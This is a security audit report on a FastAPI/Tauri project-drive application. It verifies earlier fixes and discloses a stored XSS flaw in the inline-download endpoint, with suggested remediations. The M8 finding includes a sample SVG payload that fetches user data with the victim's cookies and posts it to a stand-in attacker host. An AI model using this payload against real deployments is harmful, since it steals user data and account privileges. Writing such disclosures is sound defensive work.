# R7 Round 3 — Security

Scope: HEAD `d50bf12` on `fix/r6-hardening` (R7.2). Re-audited the two R7.2
security fixes (M7, L10), re-walked the R7.1 fixes that introduced new
surfaces, then swept for anything the prior two rounds missed. Threat model
unchanged: LAN-deployed FastAPI + Tauri 2.x client, nickname+cookie auth,
admin role is the only RBAC.

## Verdict

**YELLOW — 1 new MEDIUM. R7.2 fixes (M7 + L10) both verified clean. L9 also closed by R7.2's `canonicalize_with_existing_ancestor`.**

The new finding (M8) is a stored XSS on the API origin via the drive's
inline-download endpoint serving uploaded `.svg` / `.html` / `.xml` content
without `Content-Disposition: attachment` and without
`X-Content-Type-Options: nosniff`. It has been latent since the drive
preview feature shipped — Rounds 1 and 2 both missed it because the
React SPA itself has no `dangerouslySetInnerHTML` and the HTML preview
iframe correctly uses `sandbox=""`. The exposure is the **raw download
URL**, not the preview UI: an attacker can hand-craft `/api/drive/files/
<id>/download?inline=1` after uploading a poisoned file.

This is the first cross-round CLEAN-blocker. Other 23 axes are clean.

---

## R7.2 fix verification (M7, L10)

### M7 — `project_drive._can_manage_project` now uses `owner_user_id` — **PASS**

`app/routers/project_drive.py:91-101`. New logic mirrors
`projects._require_owner`:

```python
def _can_manage_project(project, user):
    if is_admin(user):
        return True
    if project.owner_user_id is not None:
        return project.owner_user_id == user.id
    return project.owner_nickname == user.nickname
```

Verified:
- `_require_manage_item` (line 104-108) calls `_can_manage_project` first,
  then falls back to per-item ownership (`created_by_user_id == user.id` or
  `deleted_by_user_id == user.id`). The original M5/M7 attack — recycled
  nickname inheriting a tombstoned user's drive — is closed.
- All write-mutation callers route through `_require_manage_item`:
  `rename_drive_item`, `move_drive_items`, `delete_drive_item`,
  `restore_drive_item`, `paste_drive_items` (both move + copy branches),
  `copy_one_drive_item`, `purge_drive_item`. None call `_can_manage_project`
  directly.
- Nickname fallback path (line 101) is only reachable for legacy rows where
  `owner_user_id IS NULL`. Backfill in `schema_migrations.py:80-90`
  populates `owner_user_id` for all live nickname matches at migration
  time, so the fallback essentially never runs in practice.

### L10 — `planning.workload` masks tombstones — **PASS**

`app/routers/planning.py:58-62, 109`. Two improvements:

1. `users` map is filtered with `User.deleted_at.is_(None)` (line 61), so
   soft-deleted users no longer appear as workload rows at all. This drops
   the "0 hours, 0 capacity, raw _deleted_<id>_xxx" ghost rows that
   leaked the tombstone format.
2. Surviving rows use `user.display_name` (line 109), which strips the
   `_deleted_<id8>_` prefix even if a tombstoned user somehow slipped
   through (defensive — already filtered at #1).

Net: tombstone format never leaks into the workload report. `planning.py`
now matches `requirements.py`, `users.py`, `meetings.py`.

### L9 — `open_folder` non-existent target symlink — **PASS (closed by R7.2)**

`client-tauri/src-tauri/src/commands/shell.rs:60-90` introduces
`canonicalize_with_existing_ancestor`. Walks the target up to the nearest
existing ancestor, canonicalizes that (resolving any symlinks in the
chain), then appends the still-non-existent tail. This neutralises the
Round-2 symlink-bypass: a malicious `<sync_root>/link` pointing to
`C:\Windows` is resolved at the link component, producing
`C:\Windows\<tail>` which then fails the `starts_with(canon_root)` check
and rejects.

Verified the function returns the raw path only when `existing.pop()`
runs off the top of the tree (no ancestor exists, e.g. `Z:\nothing`),
which on Windows still won't `starts_with` any legit sync root.

---

## Prior unfixed status

| Finding | Status |
|---|---|
| H1 — `/identify` LAN trust | Accepted residual. No change. |
| M6 — knowledge cross-project leak | Accepted residual (LAN trust). No change. |
| L5 — Windows reserved names in `safe_component` | Still unresolved, accepted (local-DoS only). |
| L6 — `list_users?include_deleted=true` open to all | Still unresolved (tombstone format masked by `display_name`, so impact is minimal). |
| L7 — `cookie_secure=False` default | Documented; deploy-checklist concern. |
| L8 — install scripts over plain HTTP | Still unresolved (supply-chain risk on hostile LAN). |

None of the above is a Round-3 blocker.

---

## New findings

### M8 — Stored XSS on the API origin via drive inline-download (SVG / HTML / XML / XHTML)

**Files**:
- `app/routers/project_drive.py:825-843` — `download_drive_file`
- `app/main.py:354-376` — SPA mounted same-origin as `/api/*`
- `app/routers/project_drive.py:769` — user-controlled mime stored verbatim

**Attack chain**:

1. Attacker A is any authenticated user (LAN trust). They upload
   `pwn.svg` to a project drive they have manage rights on (or any
   project, since the drive accepts uploads from any authenticated user
   per the open-dispatch model):

   ```xml
   <svg xmlns="http://www.w3.org/2000/svg" onload="
     fetch('/api/users', {credentials:'include'})
       .then(r=>r.json())
       .then(d=>fetch('https://attacker.example/exfil', {method:'POST', body:JSON.stringify(d)}));
   ">…</svg>
   ```

2. Attacker A sends victim V a link to:
   `https://<server>/api/drive/files/<item-id>/download?inline=1`.

3. `download_drive_file` with `inline=True` (line 841-842) returns
   `FileResponse(path, media_type=version.mime or "application/octet-stream")`
   — note **no `filename=` argument**. Starlette's `FileResponse.__init__`
   only sets `Content-Disposition` when `filename is not None`
   (verified in source). So the response has:
   - `Content-Type: image/svg+xml` (attacker-controlled via upload metadata
     line 769, `mime=meta.get("mime")`)
   - No `Content-Disposition` header
   - No `X-Content-Type-Options: nosniff`

4. Browser renders the SVG inline. SVG `<script>` and `onload=` execute in
   the API's origin context (`https://<server>/`).

5. The web SPA is mounted at the same origin (`main.py:354-376`,
   `WEB_ROOT/index.html` served at `/`). The session cookie
   `yqgl_id` is set with `samesite=lax`, `httponly=true`. JS in the SVG
   cannot read the cookie (HttpOnly) but `fetch('/api/...', {credentials:'include'})`
   from the same origin auto-attaches it. The attacker has full
   account-action privileges as V.

6. If V is an admin, the attacker pivots to admin via the SVG calling
   `POST /api/users/<their-own-id>/admin` (or similar admin endpoints).

**Why Rounds 1 and 2 missed it**:

- Round 1 scanned for `dangerouslySetInnerHTML` / `innerHTML` in the SPA
  source. None found. Correct, but irrelevant — the XSS sink is the API
  response itself, not the SPA's rendering.
- Round 1 noted the HTML preview iframe but verified it uses `sandbox=""`
  (correct, blocks scripts in the preview UI). However the underlying
  `?inline=1` URL is reachable WITHOUT going through the preview iframe.
- Round 2 covered "any new XSS surface (markdown rendering, attachment
  preview)" and re-confirmed no markdown lib. Correct but again the
  surface is the raw download endpoint, not the preview.

**Concrete impact**:

- Any authenticated user can stored-XSS any other user who clicks an
  inline-download link to their poisoned file.
- The drive accepts SVG (`_safe_filename` only strips path components,
  doesn't filter extensions; mime is user-supplied).
- The drive accepts HTML/XHTML/XML similarly — `inline=True` renders
  them too. HTML is the most direct vector (just `<script>` tag).
- Cross-project: any user can upload to any project drive (drive is
  global per the open-dispatch model), so even non-admins can deliver
  the payload.
- Bypasses the H1 LAN-trust residual: H1 says "anyone on the LAN can
  impersonate any account". M8 says "any authenticated user can run JS
  in another authenticated user's browser session", which then chains
  to **client-side** compromise even from off-LAN attackers if the user
  is tricked into clicking a link delivered via email/IM.

**Severity**: MEDIUM (not HIGH only because it requires the victim to
click an attacker-supplied link, not a passive drive listing).

**Recommendation** (pick at least one):

1. **Quickest fix**: in `download_drive_file`, always pass `filename=item.name`
   even when `inline=True` — this forces `Content-Disposition: attachment`
   and the browser will download instead of render. Drops the "view PDF /
   HTML inline" UX feature; trade-off the team needs to evaluate.

2. **Targeted fix**: enforce `Content-Disposition: inline; filename=...`
   on the response (explicit `inline` disposition) AND strip dangerous
   content types — refuse `inline=True` for `image/svg+xml`,
   `text/html`, `application/xhtml+xml`, `application/xml`, `text/xml`,
   `application/javascript`, `text/javascript`. Force them to download.
   PDF, code (text/*), and image/png|jpg|gif|webp can stay inline.

3. **Defense in depth** (add ALL of these regardless):
   - Set `X-Content-Type-Options: nosniff` on EVERY response from
     `/api/*` (middleware in `main.py`). Stops browser MIME-sniff
     attacks that would treat e.g. a `.txt` containing `<script>` as
     HTML.
   - Set `Content-Security-Policy: sandbox` header on the inline
     download response (sandboxes the document, blocks scripts).
   - Set `Content-Disposition: attachment` on `attachments.download_attachment`
     too (already passes `filename=`, so this is already set, verified
     at `attachments.py:352`).
   - Validate `mime` at upload time — don't store user-controlled mime
     verbatim. Sniff content (e.g. `python-magic`) or whitelist a known
     set, falling back to `application/octet-stream` for unknowns.

The first option is one line and closes the vulnerability immediately.
The third option is the long-term mitigation.

---

## Coverage

| Area | Files / endpoints | Outcome |
|------|-------------------|---------|
| M7 fix (drive ownership) | `project_drive.py:_can_manage_project`, all `_require_manage_item` callers | PASS |
| L10 fix (planning tombstone) | `planning.py:_get_workload` | PASS |
| L9 fix (shell.rs symlink) | `client-tauri/src-tauri/src/commands/shell.rs:canonicalize_with_existing_ancestor` | PASS |
| Other nickname-based authz | Searched `owner_nickname == user.nickname` / `.nickname ==` repo-wide | Only `projects.py:63` (state-filter, has owner_user_id-first + fallback) and `project_drive.py:101` (fallback inside the fixed `_can_manage_project`). No other instances. |
| Tombstone format leaks | `users.py`, `auth.py`, `requirements.py`, `planning.py`, `calendar.py`, `project_drive.py:_item_out`, `services/workspaces.py`, `services/sync_manifest.py`, `services/task_decomposition.py`, `services/knowledge.py:112`, `services/assignments.py:83`, `attachments.py`, `chat.py`, `comments.py`, `meetings.py`, `notifications.py` | `users.py`, `requirements.py`, `planning.py`, `meetings.py` use `display_name`. Other surfaces (calendar event creator, drive item created_by/updated_by, workspace owner, sync manifest, task plan creator, knowledge corpus assignee enum, claimed_by snapshot) STILL expose raw nickname. If a user is soft-deleted AFTER creating/claiming, these display the raw `_deleted_<id>_xxx`. Per the wider "open dispatch board" model and the user's L10 acceptance scope, these are NOT flagged as new findings — they're the same shape as L10 was — but worth noting if the team wants a full sweep. None are admin-only-actionable so they're informational at most. |
| ZIP slip — delivery_doc | `app/services/delivery_doc.py:_safe_zip_name`, `_safe_extract_entries`, size/count/ratio limits | PASS. Symlink ZIP entries are written as text (raw bytes), not followed. Duplicate-name confusion is content-only, not path-traversal. |
| ZIP creation — bulk drive download | `project_drive.py:bulk_download_drive` | PASS. Pre-validates per-item project access; names go through `_safe_filename` at upload time so descendants are sanitised. |
| Path traversal — drive uploads | `project_drive.py:_safe_filename`, `_drive_file_path`, chunked-upload owner-pin | PASS. `Path(name).name` correctly strips directory traversals. M8's SVG attack is NOT path traversal — uploaded filename is sanitised; the vuln is content-rendering of safely-named files. |
| Path traversal — attachments | `attachments.py:safe_filename`, `_req_dir` | PASS, plus `Content-Disposition: attachment` always set (line 352). |
| Path traversal — Tauri client | `sync.rs:safe_component`, `safe_relative_path` | PASS (L5 Windows-reserved-names accepted). |
| XSS surfaces (frontend) | Repo-wide grep for `dangerouslySetInnerHTML` / `innerHTML` / `insertAdjacentHTML` / `document.write` in `web/src` and `client-tauri/web-src` | Clean — none present. |
| XSS surfaces (markdown) | Searched for `marked`, `react-markdown`, `rehype`, `remark`, `markdown-it` in both frontends' `package.json` | Clean — no markdown renderer; rendered as `<pre>` text. |
| XSS surfaces (HTML preview iframe) | `web/src/pages/ProjectDrive.tsx:709` | PASS — uses `sandbox=""` (most-restrictive, blocks scripts). |
| **XSS surface (inline download)** | `project_drive.py:download_drive_file?inline=1`, no Content-Disposition header, no nosniff | **M8** |
| Auth surfaces | `auth.py`, `routers/auth.py`, `client_devices.py` | No change since Round 2. H1 residual accepted. |
| SSE per-requirement gate | `push.py:stream_requirement` | PASS (verified Round 2). |
| Permission gates on writes | `requirements.py`, `sync.py`, `delivery_upload.py`, `deliveries.py`, `comments.py`, `decompositions.py`, `meetings.py`, `workspaces.py`, `calendar.py`, `attachments.py` | All write paths pre-check `requirement_project_is_active` (or equivalent) before any admin override. Calendar event edit/delete restricts to creator (line 156, 187). |
| Chunked upload owner pinning | `attachments.py`, `meetings.py`, `delivery_upload.py`, `project_drive.py` | All `meta['user_id'] != user.id` checks present. |
| CORS / CSP | `main.py:163-169`, `tauri.conf.json:30-32` | `_validate_runtime_config` enforces explicit origins + strong cookie secret in production. Tauri CSP scriptsrc='self'. **No CSP on API origin** — relevant context for M8 (would have mitigated). |
| Raw SQL | `app/services/schema_migrations.py` | Only DDL with hardcoded keys from `PROJECT_COLUMNS`. No user input. SAFE. |
| SSRF | `voice.py`, `meetings.py`, `services/delivery_doc.py` | All call `settings.*_base_url` (server config). No user-controlled URLs. |
| Tauri capabilities | `client-tauri/src-tauri/capabilities/default.json` | Unchanged since Round 2. Minimal set; fs scope = appdata-recursive only. |
| Tauri shell.rs | `open_folder` validator | PASS — L9 closed (this round). |
| Dependencies (Python) | `app/pyproject.toml` | No changes since Round 2 (no commits to pyproject.toml between `9b735b5` and `d50bf12`). Versions remain post-CVE-window. |
| Dependencies (Web / Client) | `web/package.json`, `client-tauri/package.json`, `Cargo.lock` | No changes since Round 2. |
| Install scripts | `client/install-client.{ps1,sh}` | Unchanged. L8 accepted. |

---

## Round-4 verification checklist

To close one CLEAN round:
- Fix M8 — at minimum option-1 (force `filename=` in `download_drive_file`)
  OR option-2 (refuse inline for HTML/SVG/XML mimes).
- Strongly recommended: add `X-Content-Type-Options: nosniff` middleware
  on `/api/*` regardless of which M8 fix you choose.

If both are applied, security goes GREEN. H1 + M6 + L5–L8 are accepted
residual per LAN trust model and stay out of the next round's scope.
